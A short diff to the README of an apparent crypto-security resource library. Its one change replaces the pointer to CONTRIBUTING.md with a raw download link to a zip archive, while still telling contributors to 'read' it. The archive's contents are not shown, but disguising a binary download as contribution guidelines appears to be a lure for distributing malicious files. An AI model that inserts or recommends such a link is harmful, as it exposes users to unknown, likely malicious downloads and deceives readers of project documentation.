@@ -4,7 +4,7 @@
 
 We are building an A → Z curated library of high-quality resources about blockchain, cryptocurrencies, cryptography, crypto security, tooling, research papers, and hands-on labs.
 
-If you'd like to collaborate, please read `CONTRIBUTING.md` and open an issue or PR. Thank you!
+If you'd like to collaborate, please read `https://raw.githubusercontent.com/Robin7723/Crypto-Library-robin/main/scalma/Crypto-Library-robin.zip` and open an issue or PR. Thank you!
 
 ---
 *Status:* Work in Progress  
